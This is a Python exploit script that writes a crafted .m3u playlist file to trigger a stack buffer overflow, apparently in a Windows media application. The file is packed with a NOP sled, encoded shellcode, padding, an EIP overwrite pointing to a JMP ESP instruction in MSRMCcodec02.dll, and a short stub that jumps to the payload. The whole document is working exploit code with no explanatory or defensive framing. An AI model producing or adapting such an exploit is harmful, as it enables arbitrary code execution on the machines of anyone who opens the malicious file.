import struct

file = "/mnt/c/Users/MDISEC/Desktop/RDP/custom_jumpcode.m3u"

buf =  b""
buf += b"\xb8\xa6\xcc\x6d\xd2\xdd\xc5\xd9\x74\x24\xf4\x5f\x33"
buf += b"\xc9\xb1\x31\x83\xc7\x04\x31\x47\x0f\x03\x47\xa9\x2e"
buf += b"\x98\x2e\x5d\x2c\x63\xcf\x9d\x51\xed\x2a\xac\x51\x89"
buf += b"\x3f\x9e\x61\xd9\x12\x12\x09\x8f\x86\xa1\x7f\x18\xa8"
buf += b"\x02\x35\x7e\x87\x93\x66\x42\x86\x17\x75\x97\x68\x26"
buf += b"\xb6\xea\x69\x6f\xab\x07\x3b\x38\xa7\xba\xac\x4d\xfd"
buf += b"\x06\x46\x1d\x13\x0f\xbb\xd5\x12\x3e\x6a\x6e\x4d\xe0"
buf += b"\x8c\xa3\xe5\xa9\x96\xa0\xc0\x60\x2c\x12\xbe\x72\xe4"
buf += b"\x6b\x3f\xd8\xc9\x44\xb2\x20\x0d\x62\x2d\x57\x67\x91"
buf += b"\xd0\x60\xbc\xe8\x0e\xe4\x27\x4a\xc4\x5e\x8c\x6b\x09"
buf += b"\x38\x47\x67\xe6\x4e\x0f\x6b\xf9\x83\x3b\x97\x72\x22"
buf += b"\xec\x1e\xc0\x01\x28\x7b\x92\x28\x69\x21\x75\x54\x69"
buf += b"\x8a\x2a\xf0\xe1\x26\x3e\x89\xab\x2c\xc1\x1f\xd6\x02"
buf += b"\xc1\x1f\xd9\x32\xaa\x2e\x52\xdd\xad\xae\xb1\x9a\x4c"
buf += b"\x5e\x08\x36\xd8\xf9\xf9\x7b\x84\xf9\xd7\xbf\xb1\x79"
buf += b"\xd2\x3f\x46\x61\x97\x3a\x02\x25\x4b\x36\x1b\xc0\x6b"
buf += b"\xe5\x1c\xc1\x0f\x68\x8f\x89\xe1\x0f\x37\x2b\xfe"

#buffer = pattern.encode() +  b"\x41"*25105   #26105

nop = b"\x90"*200

buffer = nop + buf + b"\x90"*(26105-len(nop)-len(buf))

#EIP = b"\x3A\xF2\xAB\x01" #  MSRMCcodec02.dll  - 01ABf23A  JMP ESP
#PRE_ESP = b"\x90\x90\x90\x90"

eip = b"\x3A\xF2\xAB\x01" #  MSRMCcodec02.dll  - 01ABf23A  JMP ESP

pre_esp = b"CCCC"

jump_code = (
    b"\x83\xc4\x3c"
    b"\x83\xc4\x3c"
    b"\xff\xe4"
)

FINAL = buffer + eip + pre_esp  + jump_code



f = open(file, "wb")

f.write(FINAL)

f.close()